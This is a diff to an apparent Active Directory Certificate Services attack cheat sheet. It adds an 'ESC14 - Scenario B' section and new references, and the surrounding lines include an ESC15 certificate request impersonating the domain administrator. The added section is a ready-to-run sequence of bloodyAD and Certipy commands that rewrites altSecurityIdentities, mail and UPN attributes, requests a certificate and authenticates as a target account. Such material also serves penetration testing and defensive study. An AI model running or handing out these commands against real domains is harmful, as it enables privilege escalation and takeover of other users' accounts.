@@ -7,6 +7,7 @@
 - [ESC8](#esc8)
 - [ESC9](#esc9)
 - [ESC13](#esc13)
+- [ESC14 - Scenario B](#esc14---scenario-b)
 - [ESC15](#esc15)
 - [ESC16](#esc16)
 
@@ -17,6 +18,10 @@ sudo apt update && sudo apt install -y python3 python3-pip
 python3 -m venv certipy-venv
 source certipy-venv/bin/activate
 pip install certipy-ad
+```
+or
+```
+pipx install -f "git+https://github.com/ly4k/Certipy.git"
 ```
 # Enumeration
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
@@ -131,6 +136,26 @@ certipy req -u username -p password -ca ca -target domain -template template -dc
 ```
 python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
 ```
+## ESC14 - Scenario B
+https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82
+```
+bloodyAD --host dc -d domain -u username -p password set object target altSecurityIdentities -v 'X509:<RFC822>target@domain'
+```
+```
+bloodyAD --host dc -d domain -u owned_user -p password set object target mail -v target@domain
+```
+```
+certipy account update -u owned_user@domain -p password -user username -upn target
+```
+```
+certipy req -u username -p password -ca ca -template template -dc-ip ip
+```
+```
+certipy account update -u owned_user -p password -user username -upn username@domain -dc-ip ip
+```
+```
+certipy auth -pfx pfx -dc-ip ip -user target -domain domain
+```
 ## ESC15
 ```
 certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
@@ -169,6 +194,5 @@ certipy auth -pfx administrator.pfx -dc-ip ip -domain domain
 - https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/
 - https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/
 - https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
-# Tools
-- https://github.com/ly4k/Certipy
-- https://github.com/GhostPack/Certify
+- https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9
+- https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82
